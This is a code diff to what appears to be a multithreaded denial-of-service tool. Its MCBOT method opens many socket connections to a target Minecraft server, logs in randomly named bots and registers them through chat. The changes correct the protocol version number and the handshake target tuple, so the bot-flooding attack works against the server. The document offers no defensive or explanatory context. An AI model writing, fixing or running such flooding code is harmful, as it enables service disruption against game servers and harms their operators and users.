@@ -508,6 +508,7 @@ class Layer4(Thread):
 
     def MCBOT(self) -> None:
         s = None
+
         with suppress(Exception), self.open_connection(AF_INET, SOCK_STREAM) as s:
             Tools.send(s, Minecraft.handshake_forwarded(self._target,
                                                         self.protocolid,
@@ -516,8 +517,8 @@ class Layer4(Thread):
                                                         uuid4()))
             username = f"{con['MCBOT']}{ProxyTools.Random.rand_str(5)}"
             password = md5(username.encode()).hexdigest()[:8].title()
-
             Tools.send(s, Minecraft.login(self.protocolid, username))
+            
             sleep(1.5)
 
             Tools.send(s, Minecraft.chat(self.protocolid, "/register %s %s" % (password, password)))
@@ -1667,15 +1668,15 @@ if __name__ == '__main__':
                         else:
                             logger.setLevel("DEBUG")
                 
-                protocolid = 74
+                protocolid = 47
                 
                 if method == "MCBOT":
                     with suppress(Exception), socket(AF_INET, SOCK_STREAM) as s:
-                        Tools.send(s, Minecraft.handshake(target, protocolid, 1))
+                        Tools.send(s, Minecraft.handshake((target, port), protocolid, 1))
                         Tools.send(s, Minecraft.data(b'\x00'))
 
                         protocolid = Tools.protocolRex.search(str(s.recv(256)))
-                        protocolid = 74 if not protocolid else int(protocolid.group(1))
+                        protocolid = 47 if not protocolid else int(protocolid.group(1))
 
                 for _ in range(threads):
                     Layer4((target, port), ref, method, event,
